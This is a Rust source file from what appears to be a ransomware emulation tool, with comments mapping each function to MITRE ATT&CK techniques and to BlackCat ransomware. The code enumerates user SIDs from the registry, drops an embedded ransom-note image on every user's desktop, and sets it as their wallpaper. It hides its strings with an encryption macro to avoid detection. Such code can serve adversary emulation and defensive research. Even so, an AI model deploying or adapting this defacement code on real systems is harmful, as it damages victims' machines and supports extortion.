#![cfg(target_os = "windows")]

use std::error::Error;
use std::fs::write;
use winapi::um::winreg::{HKEY_LOCAL_MACHINE, HKEY_USERS};
use crate::logger::{log_debug, log_error, log_info};
use crate::registry::*;
use encryptliterals::esl;

/**
 * set_wallpaper
 *      About:
 *          Uses registry keys to change user's wallpapers.
 *      Result:
 *          A ransom note set as the wallpaper at next login
 *      MITRE ATT&CK Techniques:
 *          T1112: Remote Services: Modify Registry
 *          T1491.001: Internal Defacement
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn set_wallpaper(extension: &String) -> Result<(), Box<dyn Error>> {
    let ransom_note = include_bytes!("..\\resources\\ransom_note.png");
    let uppercase = &extension.to_uppercase();
    let ext = match extension.starts_with(".") {
        true => {
            let trimmed = &uppercase[1..];
            trimmed
        },
        false => {
            uppercase
        },
    };

    let sids = match get_sids() {
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to retrieve user SIDs from registry"), e))?
        }
    };

    // Set registry value for each user SID via registry
    for sid in sids {
        // Get profile path to save wallpaper image to user's desktop folder
        let profile_path = match get_profile_path_from_sid(&sid) {
            Ok(p) => p,
            Err(e) => {
                // Just log error and continue
                log_error(format!("{} {}: {:?}", esl!("Failed to set wallpaper for SID"), sid, e));
                continue;
            }
        };

        let filepath = format!("{}{}-{}-{}", profile_path, esl!("\\Desktop\\RECOVER"), ext, esl!("FILES.txt.png"));
        match write(filepath.clone(), &ransom_note) {
            Ok(_) => {
                log_debug(format!("{} {}", esl!("Saved new wallpaper at"), filepath));
            },
            Err(e) => {
                // Just log error and continue
                log_error(format!("{} {}: {:?}", esl!("Failed to save wallpaper to"), filepath, e));
                continue;
            }
        }
        
        let path = format!("{}{}", sid, esl!("\\Control Panel\\Desktop"));
        match set_reg_key_string_value(HKEY_USERS, &path, esl!("WallPaper").as_str(), &filepath, false) {
            Ok(_) => log_info(format!("{} {} to {}", esl!("Set wallpaper for SID"), sid, filepath)),
            Err(e) => {
                // Just log error and continue
                log_error(format!("{} {}: {:?}", esl!("Failed to set wallpaper for SID"), sid, e));
            }
        }
    }
    Ok(())
}

/**
 * get_sids
 *      About:
 *          Returns a String vector of the regular user account SIDs according to the HKEY_USERS registry hive.
 *      Result:
 *          String vector of regular user account SIDs, or error should HKEY_USERS enumeration fail.
 *      MITRE ATT&CK Techniques:
 *          T1012: Query Registry
 *          T1087: Account Discovery
 */
fn get_sids() -> Result<Vec<String>, u32> {
    let mut sids = Vec::new();
    let subkeys = enumerate_reg_keys(HKEY_USERS, "")?;
    for subkey in subkeys.iter() {
        if !subkey.starts_with(".") && subkey.starts_with(esl!("S-1-5-21-").as_str()) && !subkey.contains(esl!("_Classes").as_str()) {
            sids.push(subkey.clone());
        }
    }
    Ok(sids)
}

/**
 * get_profile_path_from_sid
 *      About:
 *          Returns the profile path of the user account for the given SID.
 *      Result:
 *          String profile path or error should registry lookup fail.
 *      MITRE ATT&CK Techniques:
 *          T1012: Query Registry
 *          T1087: Account Discovery
 */
 fn get_profile_path_from_sid(sid: &str) -> Result<String, u32> {
    let reg_key_path = format!("{}{}", esl!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\"), sid);
    return get_reg_key_string_value(HKEY_LOCAL_MACHINE, &reg_key_path, esl!("ProfileImagePath").as_str())
}